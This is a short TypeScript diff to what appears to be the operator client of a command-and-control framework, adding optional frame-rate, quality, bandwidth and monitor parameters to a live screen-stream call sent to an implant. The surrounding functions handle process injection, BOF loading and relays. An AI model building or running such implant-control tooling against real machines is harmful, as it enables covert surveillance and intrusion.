@@ -88,8 +88,16 @@ export const sessionApi = {
     api.post<{ task_id: number; message: string }>(`/sessions/${id}/process-injection`, data),
   loadBof: (id: string, data: string, args?: string) =>
     api.post(`/sessions/${id}/bof`, { data, args }),
-  screenStream: (id: string, action: 'start' | 'stop') =>
-    api.post<{ task_id: number; task_type: string; action: string; message: string }>(`/sessions/${id}/screen-stream`, { action }),
+  /** 实时屏幕流：可传帧率/画质/带宽/显示器等参数（服务端校验后透传植入端） */
+  screenStream: (
+    id: string,
+    action: 'start' | 'stop',
+    params?: { fps?: number; quality?: number; max_kbps?: number; monitor?: number; max_width?: number; format?: string },
+  ) =>
+    api.post<{ task_id: number; task_type: string; action: string; params?: Record<string, number | string>; message: string }>(
+      `/sessions/${id}/screen-stream`,
+      { action, ...(params || {}) },
+    ),
   relay: (id: string, action: 'start' | 'stop' | 'status', addr?: string) =>
     api.post<{ task_id: number; task_type: string; action: string; addr: string; message: string }>(`/sessions/${id}/relay`, { action, addr }),
   listRelayNodes: () =>
